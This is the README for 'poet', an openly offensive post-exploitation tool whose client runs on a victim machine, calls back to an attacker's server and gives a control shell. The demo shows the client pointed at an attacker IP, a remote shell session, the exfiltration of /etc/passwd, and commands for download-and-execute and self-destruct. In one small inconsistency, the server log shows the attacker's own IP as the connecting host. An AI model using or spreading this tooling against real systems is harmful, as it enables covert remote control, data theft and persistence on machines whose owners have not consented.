# poet

A simple POst-Exploitation Tool.

## overview

The client program runs on the target machine and is configured with an IP
address (the server) to connect to and a frequency to connect at. If the server
isn't running when the client tries to connect, the client quietly sleeps and
tries again at the next interval. If the server is running however, the
attacker gets a control shell to control the client and perform various actions
on the target including:

- reconaissance
- basic shell
- file exfiltration
- download and execute
- self destruct

## demo

The attacker has gotten access to the victim's machine and downloaded and
executed the client (in verbose mode ;). He/she does not have the server
running at this point, but it's ok, the client waits patiently. Eventually the
attacker is ready and starts the server, first starting a shell and executing
`uname -a`, then exfiltrating `/etc/passwd`. Then he/she exits and detaches
from the client, which continues running on the target waiting for the next
opportunity to connect to the server.

Victim's Machine (5.4.3.2):

```
$ ./client.py 1.2.3.4 10 -v
[+] Poet started with delay of 10 seconds to port 443. Ctrl-c to exit.
[!] (2014-09-06 02:07:03.058921) Server is inactive
[!] (2014-09-06 02:07:13.060840) Server is inactive
[!] (2014-09-06 02:07:23.062512) Server is inactive
[!] (2014-09-06 02:07:33.064214) Server is inactive
[+] (2014-09-06 02:07:43.066828) Server is active
[!] (2014-09-06 02:08:50.403668) Server is inactive
[!] (2014-09-06 02:09:00.405364) Server is inactive
```

Attacker's Machine (1.2.3.4):

```
# ./server.py
[+] Poet server started on 443.
[i] Connected By: ('1.2.3.4', 62209) at 2014-09-06 02:07:43.066092
[+] (2014-09-06 02:07:43.066531) Entering control shell
Welcome to psh, the poet shell!
Running `help' will give you a list of supported commands.
psh > shell
psh > user@server $ uname -a
Linux lolServer 3.8.0-29-generic #42~precise1-Ubuntu SMP Wed May 07 16:19:23 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
psh > user@server $ ^D
psh > exfil /etc/passwd
psh : exfil written to archive/20140906/exfil/passwd
psh > help
Commands:
  exit
  help
  exec
  recon
  shell
  exfil
  selfdestruct
  dlexec
psh > exit
[+] (2014-09-06 02:08:40.401181) Exiting control shell.
[-] (2014-09-06 02:08:40.401328) Poet terminated.
```
